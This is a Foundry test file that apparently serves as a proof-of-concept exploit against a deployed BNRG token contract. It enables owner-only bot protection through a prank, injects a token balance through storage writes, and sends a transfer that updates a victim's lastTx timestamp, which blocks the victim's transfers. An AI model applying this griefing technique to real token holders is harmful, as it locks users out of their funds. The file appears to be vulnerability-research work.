pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBNRG {
    function state() external view returns (uint8);
    function setBotProtection(bool enable) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);
    IBNRG bnerg;
    address victim = address(0x1234567890123456789012345678901234567890);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        bnerg = IBNRG(TARGET);
        vm.label(TARGET, "BNRG Token");
        vm.label(victim, "Victim");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Enable Restricted mode (prank as owner)
        address owner = bnerg.owner();
        vm.startPrank(owner);
        bnerg.setBotProtection(true);
        vm.stopPrank();

        // Step 2: Inject tokens to attacker via storage manipulation
        // balances mapping is at slot 2
        bytes32 attackerBalanceSlot = keccak256(abi.encode(attacker, 2));
        vm.store(TARGET, attackerBalanceSlot, bytes32(uint256(1000 * 1e18)));

        // Step 3: Attacker transfers to victim (updates lastTx[victim])
        bnerg.transfer(victim, 100 * 1e18);

        // Step 4: Verify victim's lastTx was updated (DoS achieved)
        // lastTx mapping is at slot 9
        bytes32 victimLastTxSlot = keccak256(abi.encode(victim, 9));
        uint256 victimLastTx = uint256(vm.load(TARGET, victimLastTxSlot));

        // Oracle check: lastTx[victim] > block.timestamp - 60
        assertGt(victimLastTx, block.timestamp - 60);
        assertGt(victimLastTx, block.timestamp - 60, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

